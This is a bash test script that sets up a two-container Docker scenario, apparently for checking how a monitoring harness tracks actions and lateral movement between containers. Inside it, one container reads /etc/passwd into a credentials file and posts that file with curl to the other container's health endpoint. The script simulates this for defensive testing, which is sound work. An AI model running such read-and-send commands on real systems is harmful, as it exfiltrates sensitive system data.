#!/usr/bin/env bash
# Multi-container lateral movement scenario.
#
# Container A: agent workspace (alpine with curl)
# Container B: "database service" (python HTTP server)
#
# The harness manages action boundaries for BOTH containers.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ── Build and start Container B (service) ──────────────────────────
echo "Building service image..."
sudo docker build -t syscon-test-service -f "$SCRIPT_DIR/Dockerfile.service" "$SCRIPT_DIR" > /dev/null 2>&1

echo "Starting service container..."
CID_B=$(sudo docker run -d --name syscon-test-service \
    syscon-test-service python3 /app/service.py)
CID_B_SHORT="${CID_B:0:12}"
sleep 2

# Get container B's IP address on the bridge network
SERVICE_IP=$(sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' syscon-test-service)
echo "Service container: $CID_B_SHORT (IP: $SERVICE_IP)"

# ── Create experiment grouping both containers ─────────────────────
EXP_ID=$(curl -s -X POST "$URL/experiments" \
    -H 'Content-Type: application/json' \
    -d '{"name":"lateral-movement-test"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('experiment_id',''))")
echo "Experiment: $EXP_ID"

curl -s -X POST "$URL/experiments/$EXP_ID/containers" \
    -H 'Content-Type: application/json' \
    -d "{\"container_id\":\"$CID\"}" > /dev/null
curl -s -X POST "$URL/experiments/$EXP_ID/containers" \
    -H 'Content-Type: application/json' \
    -d "{\"container_id\":\"$CID_B_SHORT\"}" > /dev/null

# ── Container A actions ────────────────────────────────────────────

# Action 1 on A: Read sensitive credentials
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"bash: cat /etc/passwd && cat /etc/hostname"}'
sudo docker exec "$CONTAINER" sh -c '
    cat /etc/passwd > /tmp/creds.txt
    cat /etc/hostname >> /tmp/creds.txt
'
sleep 2
curl -s -X POST "$URL/containers/$CID/actions/1/end" > /dev/null

# Action 2 on A: Send data to service container (lateral movement)
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d "{\"command\":\"bash: curl -X POST http://${SERVICE_IP}:8080/health -d @/tmp/creds.txt\"}"
sudo docker exec "$CONTAINER" sh -c "
    curl -sf -X POST http://${SERVICE_IP}:8080/health \
        -H 'Content-Type: application/json' \
        -d @/tmp/creds.txt
"
sleep 3
curl -s -X POST "$URL/containers/$CID/actions/2/end" > /dev/null

# ── Collect service container receipts ─────────────────────────────
# The service container doesn't have explicit actions — all its activity
# falls under action 0 (container lifecycle). This is the expected pattern
# for service containers: they're owned by action 0 until tainted.

# Save info for verify.sh (cleanup deferred to verify.sh)
echo "$CID_B_SHORT" > /tmp/syscon-test-service-cid
echo "$SERVICE_IP" > /tmp/syscon-test-service-ip
echo "$EXP_ID" > /tmp/syscon-test-experiment-id
